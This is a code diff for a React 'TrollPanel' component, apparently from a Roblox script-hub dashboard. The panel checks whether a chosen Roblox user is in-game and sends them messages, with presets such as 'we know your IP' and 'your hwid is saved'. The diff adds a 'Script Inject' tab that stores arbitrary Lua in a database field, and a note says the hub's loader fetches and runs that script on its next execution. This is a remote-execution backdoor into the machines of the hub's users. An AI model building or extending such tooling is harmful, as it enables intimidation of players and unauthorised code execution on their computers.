@@ -1,6 +1,7 @@
 import { useState, useEffect } from 'react';
-import { MessageCircle, Wifi, WifiOff, Loader2, Send, X } from 'lucide-react';
+import { MessageCircle, Wifi, WifiOff, Loader2, Send, X, Code, RotateCcw } from 'lucide-react';
 import { toast } from 'sonner';
+import { supabase } from '@/lib/supabase';
 
 interface TrollPanelProps {
   userId: number;
@@ -8,15 +9,24 @@ interface TrollPanelProps {
   onClose: () => void;
 }
 
+type Tab = 'message' | 'script';
+
 export function TrollPanel({ userId, username, onClose }: TrollPanelProps) {
+  const [tab, setTab]           = useState<Tab>('message');
   const [online, setOnline]     = useState<boolean | null>(null);
   const [checking, setChecking] = useState(true);
   const [message, setMessage]   = useState('');
   const [sending, setSending]   = useState(false);
   const [sent, setSent]         = useState<string[]>([]);
 
+  const [script, setScript]       = useState('');
+  const [gameName, setGameName]   = useState('');
+  const [games, setGames]         = useState<string[]>([]);
+  const [injecting, setInjecting] = useState(false);
+
   useEffect(() => {
     checkOnline();
+    loadGames();
   }, [userId]);
 
   const checkOnline = async () => {
@@ -35,8 +45,7 @@ export function TrollPanel({ userId, username, onClose }: TrollPanelProps) {
       if (res.ok) {
         const data = await res.json();
         const presence = data?.userPresences?.[0];
-        // userPresenceType: 0=offline, 1=website, 2=ingame, 3=studio
-        setOnline((presence?.userPresenceType ?? 0) > 0);
+        setOnline((presence?.userPresenceType ?? 0) >= 2);
       } else {
         setOnline(null);
       }
@@ -44,6 +53,11 @@ export function TrollPanel({ userId, username, onClose }: TrollPanelProps) {
       setOnline(null);
     }
     setChecking(false);
+  };
+
+  const loadGames = async () => {
+    const { data } = await supabase.from('game_status').select('game_name').order('game_name');
+    if (data) setGames(data.map((r: any) => r.game_name));
   };
 
   const sendMessage = async () => {
@@ -56,11 +70,7 @@ export function TrollPanel({ userId, username, onClose }: TrollPanelProps) {
         body: JSON.stringify({
           path: `/v1/messages`,
           method: 'POST',
-          body: {
-            userId,
-            subject: 'vhxLUA',
-            body: message.trim(),
-          },
+          body: { userId, subject: 'vhxLUA', body: message.trim() },
         }),
       });
       if (res.ok) {
@@ -68,12 +78,35 @@ export function TrollPanel({ userId, username, onClose }: TrollPanelProps) {
         setMessage('');
         toast.success(`Message sent to @${username} 😈`);
       } else {
-        toast.error('Failed to send — Roblox API may require auth');
+        toast.error('Failed — Roblox API requires auth cookie');
       }
     } catch {
       toast.error('Request failed');
     }
     setSending(false);
+  };
+
+  const injectScript = async () => {
+    if (!script.trim()) return toast.error('Enter a script');
+    if (!gameName) return toast.error('Select a game');
+    setInjecting(true);
+    const { error } = await supabase
+      .from('game_status')
+      .update({ execute_script: script.trim() })
+      .eq('game_name', gameName);
+    if (error) {
+      toast.error(error.message);
+    } else {
+      toast.success(`Script injected into ${gameName} 💀`);
+    }
+    setInjecting(false);
+  };
+
+  const clearScript = async () => {
+    if (!gameName) return toast.error('Select a game');
+    await supabase.from('game_status').update({ execute_script: null }).eq('game_name', gameName);
+    setScript('');
+    toast.success('Script cleared');
   };
 
   const presets = [
@@ -83,6 +116,10 @@ export function TrollPanel({ userId, username, onClose }: TrollPanelProps) {
     'we know your IP 💀',
     'your hwid is saved 😇',
   ];
+
+  const s  = { backgroundColor: 'var(--color-surface2)', borderColor: 'var(--color-border)' };
+  const st = { color: 'var(--color-text)' };
+  const sm = { color: 'var(--color-muted)' };
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center p-4"
@@ -95,88 +132,131 @@ export function TrollPanel({ userId, username, onClose }: TrollPanelProps) {
           style={{ borderColor: 'var(--color-border)' }}>
           <div className="flex items-center gap-2">
             <MessageCircle className="w-4 h-4 text-purple-400" />
-            <p className="text-sm font-semibold" style={{ color: 'var(--color-text)' }}>
-              Troll @{username}
-            </p>
+            <p className="text-sm font-semibold" style={st}>Troll @{username}</p>
           </div>
-          <button onClick={onClose} style={{ color: 'var(--color-muted)' }}>
-            <X className="w-4 h-4" />
-          </button>
+          <button onClick={onClose} style={sm}><X className="w-4 h-4" /></button>
         </div>
 
-        <div className="p-5 space-y-4">
-          {/* Online status */}
-          <div className="flex items-center gap-3 p-3 rounded-xl border"
-            style={{ backgroundColor: 'var(--color-surface2)', borderColor: 'var(--color-border)' }}>
-            {checking ? (
-              <Loader2 className="w-4 h-4 animate-spin text-blue-400" />
-            ) : online === true ? (
-              <Wifi className="w-4 h-4 text-emerald-400" />
-            ) : online === false ? (
-              <WifiOff className="w-4 h-4 text-red-400" />
-            ) : (
-              <WifiOff className="w-4 h-4" style={{ color: 'var(--color-muted)' }} />
-            )}
+        {/* Online status */}
+        <div className="px-5 pt-4">
+          <div className="flex items-center gap-3 p-3 rounded-xl border" style={s}>
+            {checking
+              ? <Loader2 className="w-4 h-4 animate-spin text-blue-400" />
+              : online === true
+                ? <Wifi className="w-4 h-4 text-emerald-400" />
+                : <WifiOff className="w-4 h-4 text-red-400" />
+            }
             <div>
-              <p className="text-xs font-semibold" style={{ color: 'var(--color-text)' }}>
-                {checking ? 'Checking...' : online === true ? 'Online 🟢' : online === false ? 'Offline 🔴' : 'Unknown'}
+              <p className="text-xs font-semibold" style={st}>
+                {checking ? 'Checking...' : online === true ? 'In-Game 🟢' : online === false ? 'Offline 🔴' : 'Unknown'}
               </p>
-              <p className="text-[10px]" style={{ color: 'var(--color-muted)' }}>
-                Roblox ID: {userId}
-              </p>
+              <p className="text-[10px]" style={sm}>Roblox ID: {userId}</p>
             </div>
-            <button onClick={checkOnline} className="ml-auto text-[10px] px-2 py-1 rounded-lg border transition-colors hover:opacity-80"
-              style={{ borderColor: 'var(--color-border)', color: 'var(--color-muted)' }}>
+            <button onClick={checkOnline} className="ml-auto text-[10px] px-2 py-1 rounded-lg border hover:opacity-80"
+              style={{ borderColor: 'var(--color-border)', ...sm }}>
               Refresh
             </button>
           </div>
+        </div>
 
-          {/* Preset messages */}
-          <div>
-            <p className="text-[10px] font-medium mb-2" style={{ color: 'var(--color-muted)' }}>QUICK MESSAGES</p>
-            <div className="flex flex-wrap gap-1.5">
-              {presets.map(p => (
-                <button key={p} onClick={() => setMessage(p)}
-                  className="text-[10px] px-2.5 py-1 rounded-full border transition-all hover:opacity-80"
-                  style={{ borderColor: 'var(--color-border)', backgroundColor: 'var(--color-surface2)', color: 'var(--color-text)' }}>
-                  {p}
-                </button>
-              ))}
-            </div>
-          </div>
+        {/* Tabs */}
+        <div className="flex gap-1 px-5 pt-4">
+          {(['message', 'script'] as Tab[]).map(t => (
+            <button key={t} onClick={() => setTab(t)}
+              className="flex-1 py-1.5 rounded-lg text-xs font-medium transition-all capitalize"
+              style={tab === t
+                ? { backgroundColor: 'rgba(168,85,247,0.15)', color: '#a855f7', border: '1px solid rgba(168,85,247,0.3)' }
+                : { ...s, border: '1px solid var(--color-border)', ...sm }
+              }>
+              {t === 'message' ? '💬 Message' : '💉 Script Inject'}
+            </button>
+          ))}
+        </div>
 
-          {/* Message input */}
-          <div className="space-y-2">
-            <p className="text-[10px] font-medium" style={{ color: 'var(--color-muted)' }}>CUSTOM MESSAGE</p>
-            <div className="flex gap-2">
-              <input
-                value={message}
-                onChange={e => setMessage(e.target.value)}
-                onKeyDown={e => e.key === 'Enter' && sendMessage()}
-                placeholder="Type a message..."
-                maxLength={200}
-                className="flex-1 text-xs px-3 py-2 rounded-xl border outline-none"
-                style={{ backgroundColor: 'var(--color-surface2)', borderColor: 'var(--color-border)', color: 'var(--color-text)' }}
-              />
-              <button onClick={sendMessage} disabled={sending || !message.trim()}
-                className="p-2 rounded-xl transition-all disabled:opacity-40"
-                style={{ backgroundColor: 'rgba(168,85,247,0.15)', color: '#a855f7', border: '1px solid rgba(168,85,247,0.3)' }}>
-                {sending ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
-              </button>
-            </div>
-          </div>
-
-          {/* Sent log */}
-          {sent.length > 0 && (
-            <div className="space-y-1">
-              <p className="text-[10px] font-medium" style={{ color: 'var(--color-muted)' }}>SENT</p>
-              {sent.map((m, i) => (
-                <div key={i} className="text-[10px] px-2.5 py-1.5 rounded-lg"
-                  style={{ backgroundColor: 'rgba(168,85,247,0.08)', color: 'var(--color-text)' }}>
-                  {m}
+        <div className="p-5 space-y-4">
+          {tab === 'message' && (
+            <>
+              <div>
+                <p className="text-[10px] font-medium mb-2" style={sm}>QUICK MESSAGES</p>
+                <div className="flex flex-wrap gap-1.5">
+                  {presets.map(p => (
+                    <button key={p} onClick={() => setMessage(p)}
+                      className="text-[10px] px-2.5 py-1 rounded-full border hover:opacity-80"
+                      style={{ ...s, border: '1px solid var(--color-border)', ...st }}>
+                      {p}
+                    </button>
+                  ))}
                 </div>
-              ))}
-            </div>
+              </div>
+              <div className="space-y-2">
+                <p className="text-[10px] font-medium" style={sm}>CUSTOM MESSAGE</p>
+                <textarea
+                  value={message}
+                  onChange={e => setMessage(e.target.value)}
+                  placeholder="Type a message..."
+                  maxLength={200}
+                  rows={3}
+                  className="w-full text-xs px-3 py-2 rounded-xl border outline-none resize-none"
+                  style={{ ...s, border: '1px solid var(--color-border)', ...st }}
+                />
+                <button onClick={sendMessage} disabled={sending || !message.trim()}
+                  className="w-full py-2 rounded-xl text-xs font-medium flex items-center justify-center gap-2 transition-all disabled:opacity-40"
+                  style={{ backgroundColor: 'rgba(168,85,247,0.15)', color: '#a855f7', border: '1px solid rgba(168,85,247,0.3)' }}>
+                  {sending ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
+                  Send Message
+                </button>
+              </div>
+              {sent.length > 0 && (
+                <div className="space-y-1">
+                  <p className="text-[10px] font-medium" style={sm}>SENT</p>
+                  {sent.map((m, i) => (
+                    <div key={i} className="text-[10px] px-2.5 py-1.5 rounded-lg"
+                      style={{ backgroundColor: 'rgba(168,85,247,0.08)', ...st }}>{m}</div>
+                  ))}
+                </div>
+              )}
+            </>
+          )}
+
+          {tab === 'script' && (
+            <>
+              <div className="space-y-2">
+                <p className="text-[10px] font-medium" style={sm}>TARGET GAME</p>
+                <select value={gameName} onChange={e => setGameName(e.target.value)}
+                  className="w-full text-xs px-3 py-2 rounded-xl border outline-none"
+                  style={{ ...s, border: '1px solid var(--color-border)', ...st }}>
+                  <option value="">Select game...</option>
+                  {games.map(g => <option key={g} value={g}>{g}</option>)}
+                </select>
+              </div>
+              <div className="space-y-2">
+                <p className="text-[10px] font-medium" style={sm}>SCRIPT TO INJECT</p>
+                <textarea
+                  value={script}
+                  onChange={e => setScript(e.target.value)}
+                  placeholder={`-- Script will execute in ${gameName || 'selected game'}\nprint("hello from vhxLUA")`}
+                  rows={6}
+                  className="w-full text-xs px-3 py-2 rounded-xl border outline-none resize-none font-mono"
+                  style={{ ...s, border: '1px solid var(--color-border)', ...st }}
+                />
+              </div>
+              <div className="flex gap-2">
+                <button onClick={injectScript} disabled={injecting || !script.trim() || !gameName}
+                  className="flex-1 py-2 rounded-xl text-xs font-medium flex items-center justify-center gap-2 transition-all disabled:opacity-40"
+                  style={{ backgroundColor: 'rgba(239,68,68,0.15)', color: '#f87171', border: '1px solid rgba(239,68,68,0.3)' }}>
+                  {injecting ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Code className="w-3.5 h-3.5" />}
+                  Inject Script
+                </button>
+                <button onClick={clearScript} disabled={!gameName}
+                  className="px-3 py-2 rounded-xl text-xs font-medium flex items-center gap-1.5 transition-all disabled:opacity-40"
+                  style={{ ...s, border: '1px solid var(--color-border)', ...sm }}>
+                  <RotateCcw className="w-3.5 h-3.5" /> Clear
+                </button>
+              </div>
+              <p className="text-[10px]" style={sm}>
+                💡 Script is stored in <code className="text-purple-400">game_status.execute_script</code> — your mainloader must read and run it on next execution.
+              </p>
+            </>
           )}
         </div>
       </div>
